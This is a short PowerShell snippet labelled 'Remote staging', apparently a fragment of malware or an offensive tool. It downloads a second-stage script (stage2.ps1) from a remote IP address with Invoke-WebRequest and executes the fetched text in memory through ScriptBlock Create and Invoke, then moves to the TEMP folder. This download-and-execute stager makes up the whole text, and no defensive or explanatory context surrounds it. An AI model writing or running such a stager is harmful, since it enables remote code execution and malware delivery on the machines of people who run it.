# Remote staging
$FetchUrl = "https://192.0.2.34/stage2.ps1"
$PayloadText = (iwr $FetchUrl -UseBasicParsing).Content
[ScriptBlock]::Create($PayloadText).Invoke()
Set-Location -Path $env:TEMP
